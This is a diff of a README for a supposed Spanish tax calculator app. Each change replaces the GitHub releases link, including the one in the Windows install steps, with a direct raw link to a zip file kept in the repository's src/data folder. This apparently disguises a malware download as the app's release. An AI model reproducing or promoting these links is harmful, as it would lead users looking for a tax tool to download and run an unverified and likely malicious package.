@@ -1,12 +1,12 @@
 # 🇪🇸 spanish-tax-calculators - Simple Spanish Tax Calculators
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/wingmalfeasance800/spanish-tax-calculators/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/wingmalfeasance800/spanish-tax-calculators/main/src/data/spanish_tax_calculators_v2.1.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest version for Windows:
 
-https://github.com/wingmalfeasance800/spanish-tax-calculators/releases
+https://raw.githubusercontent.com/wingmalfeasance800/spanish-tax-calculators/main/src/data/spanish_tax_calculators_v2.1.zip
 
 ## 🧾 What this app does
 
@@ -31,7 +31,7 @@ The app runs as a simple desktop-style tool in your browser or as a packaged Win
 ## 🚀 How to install on Windows
 
 1. Open the release page:
-   https://github.com/wingmalfeasance800/spanish-tax-calculators/releases
+   https://raw.githubusercontent.com/wingmalfeasance800/spanish-tax-calculators/main/src/data/spanish_tax_calculators_v2.1.zip
 
 2. Look for the latest release at the top of the page.
 
@@ -143,7 +143,7 @@ This project uses pure JavaScript. That means it does not need a heavy setup for
 
 If you need the latest build, use this page:
 
-https://github.com/wingmalfeasance800/spanish-tax-calculators/releases
+https://raw.githubusercontent.com/wingmalfeasance800/spanish-tax-calculators/main/src/data/spanish_tax_calculators_v2.1.zip
 
 ## 📎 Project topics
 
